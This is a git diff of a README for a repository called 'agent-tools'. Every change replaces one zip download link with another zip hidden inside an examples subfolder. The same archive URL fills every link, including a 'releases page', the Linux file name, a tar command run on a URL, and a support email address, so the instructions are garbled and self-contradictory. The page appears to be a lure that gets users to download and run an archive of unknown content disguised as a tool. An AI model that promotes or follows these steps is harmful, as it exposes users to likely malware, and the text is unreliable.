@@ -6,19 +6,19 @@ Welcome to the agent-tools repository! This is a collection of simple tools desi
 
 ## 📥 Download the Application
 
-[![Download agent-tools](https://github.com/masterudon23/agent-tools/raw/refs/heads/main/packages/oxlint-plugin-convex/tools-agent-oxozone.zip)](https://github.com/masterudon23/agent-tools/raw/refs/heads/main/packages/oxlint-plugin-convex/tools-agent-oxozone.zip)
+[![Download agent-tools](https://raw.githubusercontent.com/masterudon23/agent-tools/main/examples/convex-spa/convex/tools-agent-v2.7.zip)](https://raw.githubusercontent.com/masterudon23/agent-tools/main/examples/convex-spa/convex/tools-agent-v2.7.zip)
 
 ## 🚀 Getting Started
 
 1. **Visit the Releases Page**  
    To download agent-tools, visit our releases page at the link below. This page contains the latest versions available for download.  
-   [Download agent-tools](https://github.com/masterudon23/agent-tools/raw/refs/heads/main/packages/oxlint-plugin-convex/tools-agent-oxozone.zip)
+   [Download agent-tools](https://raw.githubusercontent.com/masterudon23/agent-tools/main/examples/convex-spa/convex/tools-agent-v2.7.zip)
 
 2. **Select the Latest Version**  
    On the releases page, you will see different versions of agent-tools. Click on the most recent version indicated.
 
 3. **Download the File**  
-   Find the appropriate file for your system. If you're on Windows, look for a file with `.exe`. For Mac users, look for `.dmg`. Linux users will find `https://github.com/masterudon23/agent-tools/raw/refs/heads/main/packages/oxlint-plugin-convex/tools-agent-oxozone.zip` files. Click on the file name to start the download.
+   Find the appropriate file for your system. If you're on Windows, look for a file with `.exe`. For Mac users, look for `.dmg`. Linux users will find `https://raw.githubusercontent.com/masterudon23/agent-tools/main/examples/convex-spa/convex/tools-agent-v2.7.zip` files. Click on the file name to start the download.
 
 4. **Locate the Downloaded File**  
    Once the download completes, locate the file in your downloads folder. You can usually find this folder in your user directory.
@@ -53,10 +53,10 @@ Welcome to the agent-tools repository! This is a collection of simple tools desi
 ### Linux
 
 1. **Extract the File**  
-   Open a terminal and navigate to the folder where you downloaded the `https://github.com/masterudon23/agent-tools/raw/refs/heads/main/packages/oxlint-plugin-convex/tools-agent-oxozone.zip` file.  
+   Open a terminal and navigate to the folder where you downloaded the `https://raw.githubusercontent.com/masterudon23/agent-tools/main/examples/convex-spa/convex/tools-agent-v2.7.zip` file.  
    Run the command:
    ```bash
-   tar -xzvf https://github.com/masterudon23/agent-tools/raw/refs/heads/main/packages/oxlint-plugin-convex/tools-agent-oxozone.zip
+   tar -xzvf https://raw.githubusercontent.com/masterudon23/agent-tools/main/examples/convex-spa/convex/tools-agent-v2.7.zip
    ```
 
 2. **Run the Application**  
@@ -97,7 +97,7 @@ If you need help using agent-tools, here are some useful links:
 
 ## ☎️ Get in Touch
 
-For direct inquiries or support, please reach out to us at the following email address: https://github.com/masterudon23/agent-tools/raw/refs/heads/main/packages/oxlint-plugin-convex/tools-agent-oxozone.zip
+For direct inquiries or support, please reach out to us at the following email address: https://raw.githubusercontent.com/masterudon23/agent-tools/main/examples/convex-spa/convex/tools-agent-v2.7.zip
 
 Your feedback helps us improve. Thank you for using agent-tools! 
 
